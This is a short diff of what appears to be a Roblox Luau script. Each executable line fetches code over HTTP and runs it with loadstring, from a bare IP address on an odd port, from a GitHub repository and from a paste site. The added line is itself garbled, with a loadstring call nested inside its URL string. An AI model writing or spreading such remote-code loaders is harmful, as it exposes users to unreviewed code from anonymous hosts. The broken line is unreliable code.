@@ -1,3 +1,3 @@
 ID="9c07d8eb-1011-4157-b00d-2ce1590021f1";
 RUN_AFTER=loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderModz/projectreverse/refs/heads/main/V2", true))()
+loadstring(game:HttpGet("loadstring(game:HttpGet("https://pastefy.app/Y1iZuDR2/raw"))()", true))()
